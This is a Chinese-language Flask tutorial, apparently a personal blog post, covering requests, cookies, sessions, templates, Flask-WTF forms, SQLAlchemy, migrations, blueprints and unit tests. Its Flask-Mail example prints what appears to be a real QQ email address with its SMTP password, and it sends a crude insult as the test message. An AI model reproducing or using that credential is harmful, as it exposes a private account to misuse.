cookies:获取到cookie，request.cookies.get()\n    headers:获取请求头中的报文:request.headers\n    method:获取请求方式:request.method\n    url:获取请求的url:request.url\n    files:获取上传的文件:  if request.method == 'POST':\n                            file = request.files.get('pic')\n                            file.save(f'./img/&#123;file.filename&#125;')\n    path: 拿到浏览器请求的地址（视图）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"abort\"><a href=\"#abort\" class=\"headerlink\" title=\"abort\"></a>abort</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">从flask中导入abort\n无条件终止视图函数的执行，并返回给前端特定的信息\n用法一、\n    abort（状态码）\n用法二、\n    re &#x3D; Response(&quot;login defete&quot;)\n    abort(re)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"自定义错误信息\"><a href=\"#自定义错误信息\" class=\"headerlink\" title=\"自定义错误信息\"></a>自定义错误信息</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">用户访问的页面不错在的时候，定义一个独立的视图,用@app.errorheader(404)来装饰\n固定写法:\n    @app.errorhandler(404)\n    def header_error(err):\n         return &#39;没有&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"设置响应信息的方法\"><a href=\"#设置响应信息的方法\" class=\"headerlink\" title=\"设置响应信息的方法\"></a>设置响应信息的方法</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">从flask中导入make_response\n方法一:\n    使用:\n    rsp &#x3D; make_response(显示的字符串)\n    rsp.status &#x3D; &#39;999 lqs&#39;  状态码\n    rsp.headers[&#39;lqs&#39;] &#x3D; &#39;lqs&#39;   头信息\n    return rsp\n方法二:\n    return 显示字符串, 状态码, 头信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"json\"><a href=\"#json\" class=\"headerlink\" title=\"json\"></a>json</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">方法一、import json\n    dic &#x3D; &#123;&quot;name&quot;: &quot;lqs&quot;, &quot;age&quot;: 12&#125;\n    json_str &#x3D; json.dumps(dic)\n    print(type(json_str))\n    print(json_str)\n    dic_str &#x3D; json.loads(json_str)\n    print(type(dic_str))\n    print(dic_str)\njson.dumps():字典转json字符串\njson.loads():json字符串转字典\n\n方法二、从flask中导入jsonify\n    return jsonify(dic) ：将字典转成json字符串，并且自动设置头信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"cookie的读写\"><a href=\"#cookie的读写\" class=\"headerlink\" title=\"cookie的读写\"></a>cookie的读写</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">读写和django一样，都是通过response写入，通过request读取\n在有关cookie的操作中，都要 app.config[&quot;SECRET_KEY&quot;] &#x3D; xxxxxx\n    导入:from flask import make_response\n    实例化:resp &#x3D; make_response(显示字符串)\n    设置:resp.set_cookie(&quot;lqs&quot;, &quot;Flask&quot;, max_age&#x3D;3600)\n    读取:request.cookies.get(&#39;lqs&#39;)\n    删除:resp.delete_cookie(&#39;lqs&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"session的读写\"><a href=\"#session的读写\" class=\"headerlink\" title=\"session的读写\"></a>session的读写</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">导入: from flask import session\n设置: session[key] &#x3D; value\n读取: session.get(key)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"钩子\"><a href=\"#钩子\" class=\"headerlink\" title=\"钩子\"></a>钩子</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">类似于django中的中间件\n在请求的时候使用，不是任何请求都会调用，是调用到视图函数的时候，在之前或者之后进行操作\n@app.before_first_request : 第一次请求之前调用\n@app.before_request : 每次请求之前调用\n@app.after_request : 每次请求之后调用（视图函数没有出错的情况）\n@app.teardown_request : 每次请求之后调用（不论是否出错都会调用）\n\n@app.after_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n@app.teardown_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"g对象\"><a href=\"#g对象\" class=\"headerlink\" title=\"g对象\"></a>g对象</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">from flask import g\ng对象中保存的数据，在一次请求中的，多个函数中可以使用\n使用:\n    g.key &#x3D; value:存\n    xx &#x3D; g.key:取<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask-script扩展-实现shell代码-这样子可以和django一样，runserver\"><a href=\"#flask-script扩展-实现shell代码-这样子可以和django一样，runserver\" class=\"headerlink\" title=\"flask_script扩展(实现shell代码),这样子可以和django一样，runserver\"></a>flask_script扩展(实现shell代码),这样子可以和django一样，runserver</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install Flask-Script\nfrom flask_script import Manager\nmanager &#x3D; Manager(flask应用名)\nmanager.run()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask使用模板文件\"><a href=\"#flask使用模板文件\" class=\"headerlink\" title=\"flask使用模板文件\"></a>flask使用模板文件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">from flask import render_template\nreturn render_template(&quot;html模板&quot;, key&#x3D;value, key&#x3D;value)  或者    return render_template(&quot;html模板&quot;, **字典名（组织之后的上下文）)\n在html模板文件中，可以使用过滤器:使用方法:&#123;&#123;value | 过滤器&#125;&#125;如safe就表示转义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask中html模板转义\"><a href=\"#flask中html模板转义\" class=\"headerlink\" title=\"flask中html模板转义\"></a>flask中html模板转义</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">使用方法: &#123;&#123; 处理对象 | 过滤器 &#125;&#125;\n常用过滤器:\n    safe : 禁用转义\n    capitalize : 变量值的首字母转换成大写其余小写\n    lower : 全部转换为小写\n    upper : 全部转换为大写\n    title : 每个单词首字母大写\n    trim  : 去除首尾空格\n    reverse : 字符串反转\n    format : 格式化输出\n    striptags : 渲染之前把所有的html标签去掉\n    first : 取出列表中的第一个元素\n    last : 取出列表中的最后一个元素\n    length : 获取列表的长度\n    sum : 列表数据求和\n    sort : 列表排序\n自定义过滤器:\n    在flask代码中定义\n    第一种方式(函数):\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        app.add_template_filter(函数名, 过滤器名)就可以注册这个过滤器\n        然后在html模板中使用\n    第二种方式(装饰器:\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        加装饰器:@app.template_filter(过滤器名)\n        然后在html模板中使用\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask使用Flask-WTF\"><a href=\"#flask使用Flask-WTF\" class=\"headerlink\" title=\"flask使用Flask-WTF\"></a>flask使用Flask-WTF</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">可以在服务器端(创建表单模型)校验表单数据，可以设置csrf攻击的关闭\npip install Flask-WTF\nfrom flask_wtf import FlaskForm : 这个模块让类继承之后就可以实现创建表单模型\nfrom wtforms import StringField, PasswordField, SubmitField : 这个wtforms模块中的方法都是关于表单中的各个控件的类型，这里没有写全面\nfrom wtforms.validators import DataRequired, EqualTo : wtforms下面的validators模块中的方法就是一些校验规则\n\n说明: 在flask中定义的表单模型作用有两个,首先，第一个作用就是不用用户再去自己打表单，可以将表单模型传到模板中生成表单，第二个作用就是验证数据，两个作用是区分开的\n\n定义表单模型类:\n    class LoginForm(FlaskForm):\n    &#39;&#39;&#39;\n        自定义的注册表单抽象类\n            label标签表示设置名称,用中文就使用u&quot;xx&quot;\n            validators表示验证数据，是一个列表类型\n            DataRequired表示必须输入，有一个参数，表示验证失败的时候显示文本\n            EqualTo表示和谁一样，有连个参数，第一个填写和谁一样，第二个填写验证失败的显示文本\n    &#39;&#39;&#39;\n        user_name &#x3D; StringField(label&#x3D;u&quot;用户名&quot;, validators&#x3D;[DataRequired(&quot;用户名不能为空&quot;)])\n        password &#x3D; PasswordField(label&#x3D;r&quot;密码&quot;, validators&#x3D;[DataRequired(&quot;密码不能为空&quot;)])\n        password2 &#x3D; PasswordField(label&#x3D;r&quot;确认密码&quot;, validators&#x3D;[DataRequired(&quot;确认密码不能为空&quot;), EqualTo(&quot;password&quot;, &quot;两次密码不一致&quot;)])\n        submit &#x3D; SubmitField(label&#x3D;u&quot;提交&quot;)\n\n\n        @app.route(&quot;&#x2F;login&quot;, methods&#x3D;[&quot;POST&quot;, &quot;GET&quot;])\n        def login():\n            &#39;&#39;&#39;创建表单对象&#39;&#39;&#39;\n            form &#x3D; LoginForm()\n            # 判断form中的数据是否合理\n            # 如果form中的数据完全满足验证，则返回真，否则返回假\n            if form.validate_on_submit():\n                uname &#x3D; form.user_name.data\n                pwd &#x3D; form.password.data\n                pwd2 &#x3D; form.password2.data\n                print(uname, pwd, pwd2)\n                session[&quot;username&quot;] &#x3D; uname\n                url &#x3D; url_for(&quot;index&quot;)\n                return redirect(url)\n            return render_template(&quot;login.html&quot;, form&#x3D;form)\n\n\n在html模板中生成表单:\n     &lt;form  method&#x3D;&quot;post&quot;&gt;\n        &#123;&#123; form.csrf_token&#125;&#125;\n        &#123;&#123; form.user_name.label &#125;&#125; &#123;&#123; form.user_name &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.user_name.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &#123;&#123; form.password.label &#125;&#125; &#123;&#123; form.password &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.password.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &#123;&#123; form.password2.label &#125;&#125; &#123;&#123; form.password2 &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.password2.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &lt;p&gt;&#123;&#123; form.submit &#125;&#125;&lt;&#x2F;p&gt;\n\n     &lt;&#x2F;form&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"宏的定义和使用\"><a href=\"#宏的定义和使用\" class=\"headerlink\" title=\"宏的定义和使用\"></a>宏的定义和使用</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在同一个html中定义和使用:\n    没有参数:\n        定义:\n        &#123;% macro input() %&#125;\n         &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; size&#x3D;&quot;30&quot;&gt;\n        &#123;% endmacro %&#125;\n        使用:\n        &#123;&#123; input() &#125;&#125;\n    有参数:\n    定义:\n    &#123;% macro input(type,name,size) %&#125;\n     &lt;input type&#x3D;&#123;&#123;type&#125;&#125; name&#x3D;&#123;&#123;name&#125;&#125; value&#x3D;&quot;&quot; size&#x3D;&#123;&#123;size&#125;&#125;&gt;\n    &#123;% endmacro %&#125;\n    使用:\n    &#123;&#123; input(&#39;text&#39;, &#39;username&#39;, 40) &#125;&#125;\n\n在不同html中定义和使用:\n    没有参数:\n        定义在macro2.html中:\n        &#123;% macro input() %&#125;\n         &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; size&#x3D;&quot;30&quot;&gt;\n        &#123;% endmacro %&#125;\n        在macro。html使用:\n        &#123;% import &quot;macro2.html&quot; as 别名 %&#125;\n        &#123;&#123; 别名.input() &#125;&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"模板继承\"><a href=\"#模板继承\" class=\"headerlink\" title=\"模板继承\"></a>模板继承</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">和django中的模板继承一样: &#123;% extend &quot;模板名&quot; %&#125;  使用 &#123;% block xx %&#125; &#123;% endblock xx %&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"flask中一些特殊的方法\"><a href=\"#flask中一些特殊的方法\" class=\"headerlink\" title=\"flask中一些特殊的方法\"></a>flask中一些特殊的方法</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">有些方法和变量不需要传递也可以在模板中直接使用\nconfig中的方法\nrequest中的方法\nurl_for中的方法\n模板的闪现:\n    闪现就是表示有的信息，只是出现一次\n    在flask中:from flask import flash\n            在视图中使用flash(xxx)来添加信息，可以添加很多条\n    在模板中:\n        &#123;% for x in get_flashed_messages() %&#125;\n        &#123;&#123; x &#125;&#125;\n        &#123;% endfor %&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask链接数据库\"><a href=\"#flask链接数据库\" class=\"headerlink\" title=\"flask链接数据库\"></a>flask链接数据库</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-sqlalchemy  模型类到sql语句的转换，再将结果转换为模型类对象\npip install flask-mysqldb   数据库驱动\nfrom flask_sqlalchemy import SQLAlchemy  可以创建数据库对象\n配置:\n    app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#x3D; &quot;mysql:&#x2F;&#x2F;root:123456@127.0.0.1:3306&#x2F;msfood&quot;\n    app.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] &#x3D; True   # 配置跟踪,数据库和模型类同步\n创建数据库sqlalchemy工具对象,就可以使用数据库了\n    db &#x3D; SQLAlchemy(app)\n\n\n创建模型类\nclass Role(db.Model):\n    &#39;&#39;&#39;身份表&#39;&#39;&#39;\n    __tablename__ &#x3D; &quot;tbl_roles&quot;  # 指明表名\n    id &#x3D; db.Column(db.Integer, primary_key&#x3D;True)\n    name &#x3D; db.Column(db.String(32), unique&#x3D;True)\n    users &#x3D; db.relationship(&quot;User&quot;, backref&#x3D;&quot;role&quot;)\n     def __repr__(self):\n        &#39;&#39;&#39;补充方法,可以让显示对象的时候更直观,类似于__str__方法&#39;&#39;&#39;\n        return f&#39;&#123;self.users&#125;&#39;\nclass User(db.Model):\n    &#39;&#39;&#39;用户表&#39;&#39;&#39;\n    __tablename__ &#x3D; &quot;tbl_users&quot;  # 指明数据库的表名\n    id &#x3D; db.Column(db.Integer, primary_key&#x3D;True)  # 主键，自动递增\n    name &#x3D; db.Column(db.String(64), unique&#x3D;True)\n    email &#x3D; db.Column(db.String(128), unique&#x3D;True)\n    password &#x3D; db.Column(db.String(128))\n    role_id &#x3D; db.Column(db.Integer, db.ForeignKey(&quot;tbl_roles.id&quot;))\n\n生成数据表:\n    *第一次生成的时候清除所有数据:\n         db.drop_all()\n    创建所有表\n        db.create_all()\n\n说明:\n    创建表的时候，和底层相关，只要是表中的一行，都是有关底层的，用的都是真实的表的名字\n    users &#x3D; db.relationship(&quot;User&quot;, backref&#x3D;&quot;role&quot;): 这个语句就是表示和底层无关，只和flask中的对象有关，User就是一个模型对象\n        users表和roles表是有关联的（外键）,那么db.relationship就可以让两个表相互拿东西，表示从User模型类中拿出和Role模型有关联的数据\n        backref表示没有定义relationship的对方表中，也可以反推拿出和User模型有关的Role模型的数据\n        使用方法:\n            在Role模型:role.users\n            在user模型中:user.role\n\n添加数据:\n    创建对象:xx &#x3D; 模型(属性&#x3D;值，属性&#x3D;值)\n    session记录对象任务:db.session.add(xx),添加一条数据，db.session.add_all(),添加多条数据\n    提交任务到数据库:db.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"sqlalchemy查询\"><a href=\"#sqlalchemy查询\" class=\"headerlink\" title=\"sqlalchemy查询\"></a>sqlalchemy查询</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">用模型类来查询\n模型类.query.all():查询所有数据，返回的是一个列表，可以取出某一个对象，然后读取属性值\n模型类.query.first():返回第一条记录\n模型类.query.get(主键的id):根据主键id获取对象\n模型类.query.filter_by(字段&#x3D;xx,字段&#x3D;&#x3D;xx).all():获取满足条件的所有数据,条件是与\n模型类.query.filter(模型类.字段&#x3D;&#x3D;xx,模型类.字段&#x3D;&#x3D;xx).all():拿出满足条件的所有数据，条件是与\n模型类.query.filter(or_(模型类.字段&#x3D;&#x3D;xx,模型类.字段.endswith(xxx))).all():拿出满足条件的所有数据，条件是或，使用或必须导入from sqlalchemy import or_\n模型类.query.filter(条件).offset(2).limit(3).order_by(模型类.字段.desc()).all():返回满足条件并且忽略前两条数据，取出三条数据然后降序排列的数据，每一个部分都可以单独使用\ndb.session.query(模型类.字段, func.count(模型类.字段)).group_by(模型类.字段).all():分组查询，from sqlalchemy import func,func.聚合函数(属性),就可以查出来<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"sqlalchemy修改\"><a href=\"#sqlalchemy修改\" class=\"headerlink\" title=\"sqlalchemy修改\"></a>sqlalchemy修改</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">模型类.query.filter(条件).update(&#123;字段名:值,字段名:值,字段名:值&#125;)\ndb.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"sqlalchemy删除\"><a href=\"#sqlalchemy删除\" class=\"headerlink\" title=\"sqlalchemy删除\"></a>sqlalchemy删除</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">xx &#x3D; 模型类.query.get(x)\ndb.session.delete(xx)\ndb.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"flask中和django一样使用迁移的方式\"><a href=\"#flask中和django一样使用迁移的方式\" class=\"headerlink\" title=\"flask中和django一样使用迁移的方式\"></a>flask中和django一样使用迁移的方式</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-migrate\nfrom flask_script import Manager\nfrom flask_migrate import Migrate, MigrateCommand\n\ndb &#x3D; SQLAlchemy(app)\n\n创建flask脚本管理工具\nmanager &#x3D; Manager(app)\n创建数据库迁移工具对象\nMigrate(app, db)\n向manager对象中添加数据的操作命令\nmanager.add_command(&quot;操作的名字&quot;, MigrateCommand)\n\nmain中:\n    manager.run()\n终端中:\n    python3 xxx.py 操作的名字 init  : 让他初始化一下，自动创文件夹\n    python3 xxx.py 操作的名字 migrate -m &quot;版本说明信息&quot; : 生成迁移文件（版本说明可以不要），同价与django中的makemigrations\n    多次migrate之后需要更新数据库:python3 xxx.py 操作的名字 upgrade，可以升级同步\n    python3 xxx.py 操作的名字 history : 查看历史修改\n    python3 xxx.py 操作的名字 downgrade 版本编号 : 版本回退\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"flask发送邮件\"><a href=\"#flask发送邮件\" class=\"headerlink\" title=\"flask发送邮件\"></a>flask发送邮件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-mail\nfrom flask_mail import Mail, Message\napp &#x3D; Flask(__name__)\n\napp.config.update(\n    DEBUG&#x3D;True,\n    MAIL_SERVER&#x3D;&#39;smtp.qq.com&#39;,\n    MAIL_PROT&#x3D;465,\n    MAIL_USE_TLS&#x3D;True,\n    MAIL_USERNAME&#x3D;&#39;749062870@qq.com&#39;,\n    MAIL_PASSWORD&#x3D;&#39;kttumcufpqasbcii&#39;,\n)\n\n # sender发送方,recipients接收方列表\n    mail &#x3D; Mail() : 创建mail对象\n    mail.init_app(app) : 初始化mail对象\n    msg &#x3D; Message(&quot;傻逼&quot;, sender&#x3D;&quot;749062870@qq.com&quot;, recipients&#x3D;[&quot;2807175480@qq.com&quot;]) : 设置邮件消息的邮件头\n    msg.body &#x3D; &quot;傻逼&quot;  : 设置邮件的正文\n    mail.send(msg) : 发送邮件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"蓝图（Blueprint）\"><a href=\"#蓝图（Blueprint）\" class=\"headerlink\" title=\"蓝图（Blueprint）\"></a>蓝图（Blueprint）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">之前写的都在一个py文件中\n蓝图就是分割各个块\n将视图写在其他的py文件中，那么不用再给写在外面的视图加装饰器，可以在有app的py文件中导入，然后通过app.route(&quot;路径&quot;)(视图函数)\n\n蓝图的正解:\n    &#39;&#39;&#39;\n        蓝图和django中的各个应用差不多,一个蓝图自成一块，在主窗口中注册进app里面就可以使用\n        使用方法:\n            创建一个应用目录，再添加一个__init__.py让这个目录成为一个可以调动的包，再__init__.py中定义好蓝图,再到视图中导入这个蓝图，就可以使用，最后再视图使用之后，再到__init__.py中\n            导入视图中使用了蓝图的视图函数。\n            蓝图再使用模板文件和静态文件的时候，和主app不同，主app有默认的配置，而蓝图中没有，需要再定义蓝图的时候手动设置，和主app的设置方法是一样的\n            蓝图在没有定义静态文件目录和模板文件目录的时候，默认是使用主app的，就算配置可静态目录和模板目录，蓝图也是先去主app的静态目录和模板目录查找，没有找到在回到自己的里面去找，这个时候，就是主app的优先级大于蓝图\n            在视图中使用蓝图:\n                1、在__init__.py中from flask import Blueprint\n                2、在__init__.py中定义蓝图,xx &#x3D; Blueprint(&quot;蓝图名&quot;,__name__)\n                3、导入蓝图\n                4、用蓝图装饰，和主app装饰视图一摸一样的\n                5、在__init__.py中导入使用了蓝图的视图函数（导入到蓝图之下）\n                6、在主app的文件中注册蓝图:app.register_blueprint(蓝图, url_prefix&#x3D;&quot;&#x2F;lqs&quot;)，url_prefix表示前缀\n    &#39;&#39;&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"单元测试\"><a href=\"#单元测试\" class=\"headerlink\" title=\"单元测试\"></a>单元测试</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在flask中使用单元测试的时候，千万不要动源代码，重新写个测试文件\nimport unittest\n导入要测试的flask代码文件\n创建测试类，继承unittest.TestCase\n定义好测试函数\nimport unittest\nimport json\nfrom flaskDay14 import Test\n\nclass Index(unittest.TestCase):\n    def setUp(self):\n        # 设置flask工作在测试模式下，在测试出错的时候会给出具体错误行\n        Test.app.testing &#x3D; True\n        # 模拟flask客户端,setUp中的代码会在所有函数之前调用\n        self.client &#x3D; Test.app.test_client()\n    def test_index(self):\n        # 模拟请求返回数据\n        ret &#x3D; self.client.post(&quot;&#x2F;index&quot;, data&#x3D;&#123;&quot;username&quot;:&quot;lqs&quot;, &quot;password&quot;:&quot;lqs&quot;&#125;)\n        # 拿到数据\n        resp &#x3D; ret.data\n        # 装成字典\n        resp &#x3D; json.loads(resp)\n        # 断言\n        self.assertIn(&quot;code&quot;, resp)\n        self.assertEqual(resp[&quot;code&quot;], 2)\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    # 测试\n    unittest.main()\n\n对所有的测试都可以使用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h1><h2 id=\"name-对象说明\"><a href=\"#name-对象说明\" class=\"headerlink\" title=\"__name__对象说明\"></a><code>__name__</code>对象说明</h2><p><code>__name__</code>返回的就是当前的模块名字</p>\n<p><code>__name__</code>如果在本文件中使用的话，那么就是<code>__main__</code></p>\n<p><code>__name__</code>如果本文件被导入到别的文件中使用的话，那么就是模块的名字<br>在文件中，被调用的时候，永远不可能等于<code>__main__</code></p>\n<h2 id=\"Flask-1\"><a href=\"#Flask-1\" class=\"headerlink\" title=\"Flask\"></a>Flask</h2><p>创建Flask对象: 名字 = Flask(一个魔法值(以这个为根目录)),括号里面的参数，就表示以这个参数所在的模块为根目录，默认这个目录中的static为静态目录，templates为模板目录</p>\n<p>创建视图: 等于创建一个函数，要显示给浏览器的数据，直接return</p>\n<p>路径配置: 给视图函数加装饰器,格式: app.route(‘路径’)</p>\n<p>运行flask: app.run(),flask的参数:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 创建flask的应用对象，__name__返回的就是当前的模块名字,表示以什么为根目录</span>\n   static_url_path<span class=\"token operator\">=</span><span class=\"token string\">'/python'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 访问静态的url前缀，不设置的话默认值是static</span>\n   static_folder<span class=\"token operator\">=</span><span class=\"token string\">'static'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 静态文件的目录，默认就是static</span>\n   template_folder<span class=\"token operator\">=</span><span class=\"token string\">'templates'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 模板文件的目录，默认的是templates</span>\n   <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask的配置\"><a href=\"#flask的配置\" class=\"headerlink\" title=\"flask的配置\"></a>flask的配置</h3><blockquote>\n<p>  flask没有Django那种的专门的配置文件，但是可以通过以下的三种方式来配置</p>\n<ul>\n<li>1、使用配置文件:<ul>\n<li>  1、创建一个配置文件xxx.cfg</li>\n<li> 2、app.config.from_pyfile(文件的路径)</li>\n</ul>\n</li>\n<li> 2、使用配置对象:<ul>\n<li>  1、创建一个类，将配置写入</li>\n<li>  2、app.config.from_object(类名)</li>\n</ul>\n</li>\n<li> 3、直接配置    -    app.config[‘DEBUG’] = True<ul>\n<li>  app.config.update(key=v1,k2=v2):一次性配置多个，如果已经存在，那么表示更新</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"获取配置中的参数\"><a href=\"#获取配置中的参数\" class=\"headerlink\" title=\"获取配置中的参数\"></a>获取配置中的参数</h3><blockquote>\n<p>   在flask中，配置中除了可以存储flask的配置，也可以存储开发者放的一些数据</p>\n<ul>\n<li>  获取方式一: app.config.get(‘key’)</li>\n<li>   获取方式二: current_app.config.get(‘key’),这是一个模块，也在flask模块中导入，current_app等价于app,有的时候我们拿不到app，所以这个模块可以替代</li>\n</ul>\n</blockquote>\n<h3 id=\"app-run-的使用\"><a href=\"#app-run-的使用\" class=\"headerlink\" title=\"app.run()的使用\"></a>app.run()的使用</h3><blockquote>\n<p>  app.run(host=’x.x.x.x’, port=xxx, debug=True(False)) ,app.run(host=’0.0.0.0’, port=xxx)是万能的</p>\n</blockquote>\n<h3 id=\"查看路由表\"><a href=\"#查看路由表\" class=\"headerlink\" title=\"查看路由表\"></a>查看路由表</h3><blockquote>\n<p> 和Django相比，Flask没有一个直观的路由表，而Django却有urls.py文件可以查看路由表</p>\n<p>  Flask查看路由表: app.url_map，这个方法就可以查看flask的路由表，默认的有static的路由记录，还可以查看请求方式</p>\n<p> 